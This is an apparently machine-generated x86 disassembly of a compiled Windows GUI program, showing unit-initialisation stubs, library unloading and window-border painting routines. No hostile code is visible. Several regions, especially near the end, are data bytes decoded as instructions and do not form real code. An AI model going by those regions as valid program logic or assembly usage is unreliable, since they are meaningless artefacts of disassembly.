mov eax [ r-xdata ]
call sub_423c8c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_4042f4
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42efca
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_42efd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42eff5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42effc
retn
sub_42f017
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f05c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f063
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404970
sub_42f07f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f0c4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f0cb
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404970
sub_42f0db
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f131
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f138
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403ee8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f144
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f188
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f18f
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f19c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f1c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f1c8
retn
sub_42f2d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f343
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f34a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404924
mov eax rw-data
mov edx [ r-xdata ]
call sub_404924
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f59c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_426588
mov [ esi + 0x5 ] al
call sub_42f274
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42ff14
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42f5e8
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_42f688
call sub_4263c8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42f61c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42f688
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42f6cc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f61c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f71c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f61c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42f768
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f61c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f7ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f61c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42f7f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42f61c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42f85c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404734
push eax
mov eax esi
call sub_404724
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f61c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42f8c0
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f944
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f980
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42fa1c
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42fa39 ]
jmp [ eax * 4 + jump_table_42faa2 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42fda8
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42ff03
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42f944
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42f768
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412be0
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42ff30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ff6b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff72
retn
mov eax [ rw-data ]
call sub_403198
mov eax rw-data
call sub_403ee8
sub_4309ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
or al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx ] cl
inc ebx
add [ eax + 0x64000001 ] dl
or [ ebx ] al
shl [ ecx + 0x33ec0041 ] 0x40
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
test [ ecx + 0x31300043 ] bh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x1f ] cl
inc esp
add [ esi + eax * 8 + 0x43 ] ah
add [ edx + edi * 4 + 0x43 ] bl
add [ esi + eax * 2 + 0x41 ] dl
add [ edx + esi + 0x43 ] cl
add [ esp + esi ] dh
inc ebx
add [ ecx + ebx * 4 - 0x5ca7ffbd ] ch
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x2f340041 ]
inc ebx
add ah dh
mov ah 0x43
add al dh
mov ah 0x43
add al al
mov ch 0x43
add [ eax + ebx * 4 - 0x6007ffbd ] dh
inc ebx
add [ edi + ebx * 4 + 0x43 ] bl
add [ eax + ebp * 4 - 0x6803ffbd ] al
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
push esp
xor eax [ ebx ]
js r-xdata
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add al dh
mov bh 0x43
add [ eax + ecx * 8 - 0x55bbffbd ] ch
inc ebx
add [ eax + 0x2c0043aa ] bh
fwait
inc ebx
add [ eax + 0x500043aa ] bl
xor [ ebx ] eax
int3
sub_43111c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ fs : ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x12
inc ebx
add [ esi + 0x12 ] cl
inc ebx
add [ edx + eax ] cl
add [ eax ] al
sbb [ esi + 0x43 ] ah
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x363c0041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
xor [ edi ] 0x43
add ah cl
aaa
inc ebx
add [ eax - 0x27ffbcca ] dl
inc ebx
add [ esi ] cl
push esp
inc edx
jne r-xdata
add al bh
aaa
inc ebx
add al ah
fiadd [ ebx ]
adc ch bl
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
add al dl
call 0x31731311
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x700043cb ] ch
sbb [ eax + eax - 0x68 ] al
loopne r-xdata
je r-xdata
je r-xdata
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
inc esp
add ah bh
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
add [ esi + eax * 2 + 0x41 ] dl
hlt
outsb
inc ebx
outsd
outsb
je r-xdata
add [ esi + eax * 8 ] ch
shr al 0x1
inc ebx
outsd
jb r-xdata
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add al ah
inc ebx
add [ edi + esi ] al
inc ebx
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
pop es
add [ ecx + edi + 0x43 ] al
add al ah
fiadd [ ebx ]
cmp [ ecx ] 0x43
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
inc esp
outsd
add [ eax ] dh
insb
lea eax [ eax ]
adc al [ fs : ebx ]
pop es
push cs
push esp
inc edx
jne r-xdata
dec eax
[ ecx + edi + 0x3a1c0043 ]
mov al [ 0xffffffff9800433a ]
cmp [ ebx ] eax
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
inc ebx
je r-xdata
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
and [ ebx ] bh
inc ebx
add ah dh
cmp al [ ebx ]
xchg esp eax
cmp [ ebx ] al
mov eax 0x7004338
push esp
inc edx
jne r-xdata
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add al ah
inc ebx
add [ edi + esi ] al
inc ebx
add [ eax + edi + 0x80043 ] bh
add eax 0x7b006b0
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
outsb
inc ebx
outsd
outsb
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
mov eax eax
in al dx
adc eax [ ebx ]
pop es
pop es
push esp
inc edx
jne r-xdata
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x38300041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
sub al 0xc6
outsd
insb
adc [ fs : ebx ] eax
int3
add bh bh
inc esp
0x43
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
add [ eax + 0x4208000d ] al
outsb
fcom [ edx ]
inc ebx
add [ eax + 0x12 ] ah
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
and al 0x57
inc ebx
add [ eax - 0x5b ] dh
inc ebx
add [ eax + 0x6c0043a5 ] ah
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
je r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
popad
add [ eax ] al
inc esp
cwde
inc ebx
add [ eax - 0x67 ] ah
add [ ebx + ebp + 0x41 ] ch
add [ eax + eax ] bh
add dh bh
in al 0x98
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
rcl [ 0x5f0041 ] 0x0
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
call [ eax ]
cmp [ ebx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
push esp
mov ch 0x41
add [ eax ] ch
je r-xdata
jae r-xdata
push eax
inc ebx
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push eax
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
sub [ ebp + 0x10043 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + 0x6f ] edx
jo r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
jmp [ esi + 0x43 ]
jae r-xdata
nop
